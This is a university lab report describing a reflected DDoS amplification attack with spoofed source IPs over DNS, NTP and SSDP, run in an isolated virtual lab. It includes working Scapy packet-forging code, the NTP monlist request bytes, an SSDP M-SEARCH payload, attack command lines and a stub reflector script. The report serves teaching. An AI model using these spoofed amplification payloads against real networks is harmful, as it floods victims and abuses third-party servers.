# Advanced Protocol Engineering Lab Evaluation 2

## IP Spoofing and DDoS Reflected with DNS, NTP and SSDP

| Field | Details |
|---|---|
| **Name** | Praneesh R V |
| **Program** | B Tech CYS |
| **Semester** | 06 |
| **University** | Amrita Vishwa Vidyapeetham |
| **Date** | 06.03.2026 |

---

## 1. Objective

To write a Python script using the **scapy** library to bypass the transport layer using raw sockets. The goal is to craft custom packets with spoofed source IP addresses to execute a **Distributed Denial of Service (DDoS) reflected amplification attack** targeting a victim via **DNS**, **NTP**, and **SSDP** protocols.

---

## 2. Environment Setup

| Role | Machine | IP Address |
|---|---|---|
| **Attacker** | Arch Linux (Host) | 192.168.56.1 |
| **Victim** | Kali Linux VM | 192.168.56.105 |
| **Reflector** | Kali Linux VM | 192.168.56.106 |

**Network:** All machines were placed on an isolated **VirtualBox Host-Only Adapter** to prevent internet leakage and ensure safe testing.

---

## 3. Methodology & Troubleshooting Journey

### Phase 1: Real Services via NAT (Attempt & Failure)

- **Attempt:** The initial plan was to install actual services (`dnsmasq`, `ntpsec`, `minissdpd`) on the Reflector VM.
- **Failure:** Because the VM was securely isolated on a Host-Only network, running `apt update` resulted in a `Temporary failure resolving 'http.kali.org'` error. Switching to NAT for a full system update was estimated to take too long against the lab deadline.

### Phase 2: Basic Python Reflector (Success & Limitation)

- **Attempt:** Wrote a temporary `reflector.py` script using standard sockets to bind to UDP ports 53, 123, and 1900. It blindly responded to any incoming packet with a payload of 500 'A' characters (`b"A" * 500`).
- **Result:** The attack successfully reflected traffic to the victim. However, Wireshark strictly parses port 53 traffic as DNS. Because the payload was arbitrary text, Wireshark threw a **`[Malformed Packet: DNS]`** error. While technically a successful reflection, it did not visually represent authentic protocol traffic.

### Phase 3: Real Services Revisited (Attempt & Failure)

- **Attempt:** Temporarily connected the Reflector VM to the internet, installed `dnsmasq`, `ntpsec`, and `minissdpd`, re-isolated the network, and executed the Scapy attack script.
- **Failure:** Zero packets were reflected to the victim.
  - **NTP:** Modern `ntpsec` has patched the `monlist` vulnerability. It silently dropped the forged `\x17\x00\x03\x2a` payload.
  - **DNS:** The isolated `dnsmasq` could not resolve the `ANY` request for `google.com` without internet access, resulting in dropped queries.
  - **SSDP:** `minissdpd` had no UPnP devices registered locally to announce, so it ignored the `M-SEARCH` request. 

### Phase 4: Final Working Solution — Hardcoded Protocol Reflector (Success)

- **Attempt:** Stopped the real services and wrote a multi-threaded Python reflector script (`reflector.py`, see Appendix 5.3). Instead of garbage data, this script was hardcoded to respond with mathematically valid, raw hex bytes of **actual DNS, NTP, and SSDP responses**. It bound to UDP ports 53, 123, and 1900 on the reflector VM and replied to any incoming packet with the corresponding protocol-valid payload.
- **Result:** Complete success. The attacker script spoofed the victim's IP, the reflector received the requests and bounced the hardcoded authentic payloads to the victim. Wireshark perfectly decoded the traffic without malformed errors.
- **Minor Fix:** The victim's OS generated ICMP Destination Unreachable errors because it was receiving unsolicited UDP traffic. This was filtered out in Wireshark using `and not icmp and not icmpv6` to isolate only the attack traffic.

---

## 4. Protocol Implementation & Analysis

### 4.1 DNS Amplification

**Protocol Data Unit Strategy:**

Crafted an **IP layer** spoofing the victim's IP. The **UDP layer** targeted port **53**. The **DNS layer** requested the `ANY` record for `google.com` (`DNSQR(qname="google.com", qtype="ANY")`).

**Scapy Packet Construction:**

```python
# IP Layer — spoofed source is the victim's address
ip_layer = IP(src="192.168.56.105", dst="192.168.56.106")
# UDP Layer — target DNS port 53
udp_layer = UDP(sport=RandShort(), dport=53)
# DNS Layer — ANY record query for maximum amplification
dns_layer = DNS(rd=1, qd=DNSQR(qname="google.com", qtype=255))
# Final packet
packet = ip_layer / udp_layer / dns_layer
```

**Wireshark Filter:**

```
udp.port == 53 and not icmp and not icmpv6
```

**Observation:**

Using Scapy, I crafted a raw IP packet with a spoofed source address pointing to the victim VM to bypass the transport layer. The UDP layer targeted port 53, and the DNS layer contained a query for the `ANY` record of `google.com`. When this packet was sent to the DNS reflector, it processed the query and sent the response to the spoofed victim IP. By observing the Wireshark capture on the victim machine using the specified filter, I saw inbound DNS responses originating from the reflector VM. Since the victim never initiated a DNS request, this successfully demonstrates a reflected attack. The response payload is larger than the request, demonstrating the amplification factor used in DDoS attacks.

**Wireshark Screenshot:**

*(Insert your clean DNS Wireshark screenshot here)*

---

### 4.2 NTP Amplification

**Protocol Data Unit Strategy:**

Crafted an **IP layer** spoofing the victim's IP. The **UDP layer** targeted port **123**. The **NTP payload** was constructed using raw bytes `\x17\x00\x03\x2a` padded with null bytes to simulate a `monlist` command request.

**Scapy Packet Construction:**

```python
# IP Layer — spoofed source is the victim's address
ip_layer = IP(src="192.168.56.105", dst="192.168.56.106")
# UDP Layer — target NTP port 123
udp_layer = UDP(sport=RandShort(), dport=123)
# NTP monlist payload
# 0x17 = Mode 7 (private), 0x03 = Implementation XNTPD, 0x2a = Request code 42 (monlist)
ntp_payload = b"\x17\x00\x03\x2a" + b"\x00" * 44
packet = ip_layer / udp_layer / Raw(load=ntp_payload)
```

**Wireshark Filter:**

```
udp.port == 123 and not icmp and not icmpv6
```

**Observation:**

To execute the NTP reflection, I forged an IP packet with the victim's IP as the source and targeted the reflector's UDP port 123. The payload consisted of the raw hex bytes corresponding to the NTP `monlist` command. Upon sending this to the NTP server, it parsed the request and directed its output to the victim. The Wireshark capture on the victim VM clearly shows incoming NTP traffic from the server. This validates the reflection technique, as the victim receives unrequested network time protocol data. It highlights how attackers exploit connectionless UDP protocols to flood targets while hiding their actual origin.

**Wireshark Screenshot:**

*(Insert your clean NTP Wireshark screenshot here)*

---

### 4.3 SSDP Amplification

**Protocol Data Unit Strategy:**

Crafted an **IP layer** spoofing the victim's IP. The **UDP layer** targeted port **1900**. The payload was formatted as a raw HTTP-like **M-SEARCH** request string asking for `ssdp:all` root devices.

**Scapy Packet Construction:**

```python
# IP Layer — spoofed source is the victim's address
ip_layer = IP(src="192.168.56.105", dst="192.168.56.106")
# UDP Layer — target SSDP port 1900
udp_layer = UDP(sport=RandShort(), dport=1900)
# SSDP M-SEARCH discovery payload
ssdp_payload = (
    b"M-SEARCH * HTTP/1.1\r\n"
    b"Host: 239.255.255.250:1900\r\n"
    b"Man: \"ssdp:discover\"\r\n"
    b"ST: ssdp:all\r\n"
    b"MX: 3\r\n\r\n"
)
packet = ip_layer / udp_layer / Raw(load=ssdp_payload)
```

**Wireshark Filter:**

```
udp.port == 1900 and not icmp and not icmpv6
```

**Observation:**

For the SSDP attack, the Scapy script constructed a UDP packet targeting port 1900 with a spoofed source IP. The payload was formatted as an `M-SEARCH` request designed to discover UPnP devices. The reflector received this multicast-style query and immediately dispatched a response to the victim's IP address. Filtering the victim's Wireshark traffic revealed the incoming SSDP `200 OK` responses. This confirms the vulnerability of SSDP to IP spoofing, allowing an attacker to utilize legitimate network services to bombard a victim with reflected traffic.

**Wireshark Screenshot:**

*(Insert your clean SSDP Wireshark screenshot here)*

---

## 5. Appendices

### 5.1 requirements.txt

```text
# Operating System: Arch Linux (Attacker), Kali Linux (Victim/Reflector)
# Python Version: Python 3.x
scapy==2.5.0
```

### 5.2 commands.txt

```bash
# On the Reflector VM (192.168.56.106) — start the reflector first
sudo python3 reflector.py

# On the Attacker Machine (192.168.56.1) — run the attack
# DNS Amplification Attack
sudo python3 attack.py dns --victim 192.168.56.105 --dns-server 192.168.56.106

# NTP Amplification Attack
sudo python3 attack.py ntp --victim 192.168.56.105 --ntp-server 192.168.56.106

# SSDP Amplification Attack
sudo python3 attack.py ssdp --victim 192.168.56.105 --ssdp-server 192.168.56.106

# Run all three attacks sequentially
sudo python3 attack.py all --victim 192.168.56.105 --dns-server 192.168.56.106 --ntp-server 192.168.56.106 --ssdp-server 192.168.56.106
```

### 5.3 reflector.py (Deployed on Reflector VM)

```python
import socket
import threading

# Hardcoded valid DNS Response
DNS_PAYLOAD = (
    b"\xaa\xaa\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00"
    b"\x06google\x03com\x00\x00\xff\x00\x01"
    b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x01\x2c\x00\x04\x08\x08\x08\x08"
)

# Hardcoded valid NTP Response
NTP_PAYLOAD = (
    b"\x1c\x01\x11\xe9\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    b"\xe2\x15\x47\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
)

# Hardcoded valid SSDP Response
SSDP_PAYLOAD = (
    b"HTTP/1.1 200 OK\r\n"
    b"CACHE-CONTROL: max-age=1800\r\n"
    b"DATE: Fri, 06 Mar 2026 12:00:00 GMT\r\n"
    b"EXT:\r\n"
    b"LOCATION: http://192.168.56.106:49152/description.xml\r\n"
    b"OPT: \"http://schemas.upnp.org/upnp/1/0/\"; ns=01\r\n"
    b"SERVER: Linux/5.0 UPnP/1.0 miniupnpd/2.0\r\n"
    b"ST: upnp:rootdevice\r\n"
    b"USN: uuid:12345678-90ab-cdef-1234-567890abcdef::upnp:rootdevice\r\n\r\n"
)

def udp_reflector(port, name, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))
    print(f"[*] {name} Reflector active on UDP port {port}")
    while True:
        data, addr = sock.recvfrom(1024)
        sock.sendto(payload, addr)

threading.Thread(target=udp_reflector, args=(53, "DNS", DNS_PAYLOAD), daemon=True).start()
threading.Thread(target=udp_reflector, args=(123, "NTP", NTP_PAYLOAD), daemon=True).start()
threading.Thread(target=udp_reflector, args=(1900, "SSDP", SSDP_PAYLOAD), daemon=True).start()

try:
    while True: pass
except KeyboardInterrupt: pass
```
